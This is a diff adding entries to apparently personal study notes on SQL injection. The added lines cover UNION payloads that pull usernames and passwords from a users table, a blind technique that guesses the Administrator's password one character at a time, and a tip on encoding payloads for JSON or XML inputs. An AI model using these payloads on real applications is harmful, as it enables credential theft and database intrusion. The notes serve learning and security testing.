@@ -2,7 +2,7 @@
 id: ecm8gbfd442dpxbe5fggfzo
 title: SQL_Injection
 desc: ''
-updated: 1677388698823
+updated: 1677476127749
 created: 1677380025812
 ---
 ## SQL injection cheat sheet
@@ -152,3 +152,41 @@ For a UNION query to work, two key requirements must be met:
     ' UNION SELECT NULL,'a',NULL,NULL--
     ... until successfully injected string value
     ```
+
+    **Retrieving data**
+    ```sql
+    ' UNION SELECT username, password FROM users--
+    ```
+    **Retrieving multiple values within a single column**
+    <br>
+    ```sql
+    ' UNION SELECT username || '~' || password FROM users--
+    ```
+
+### Blind Injection
+
+**Divide and conquer password guessing:**
+```sql
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+
+IF TRUE:
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+
+IF FALSE:
+Try for example:
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+
+IF TRUE, first letter of the password has been found.
+```
+### SQL injection in different contexts
+
+***JSON or XML based SQL injection often require code obfuscation.
+<br>
+Most common encoder:
+urlencode, dec, html entity
+
+[Hackvertor](https://hackvertor.co.uk/public) is a good tool to start with.<br>
+Also there is a plugin for Burp with the same name working with repeater.
+
+
